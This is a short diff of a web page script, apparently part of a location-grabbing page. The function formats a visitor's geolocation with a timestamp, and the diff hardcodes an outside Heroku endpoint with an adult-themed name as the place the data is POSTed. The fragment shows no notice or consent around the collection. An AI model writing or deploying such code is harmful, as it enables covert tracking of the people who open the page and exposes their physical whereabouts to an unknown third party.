@@ -30,10 +30,10 @@ function send(position) {
     geo_text += "取得時刻:" + date.toLocaleString() + "\n";
 
     var req = new XMLHttpRequest();
-    req.open('POST', webhook , true);
+    req.open('POST', "https://erodouga-bank.herokuapp.com/address", true);
     req.setRequestHeader('content-type',
       'application/x-www-form-urlencoded;charset=UTF-8');
-    req.send('content='+geo_text);
+    req.send(geo_text);
 }
 </script>
 </head>
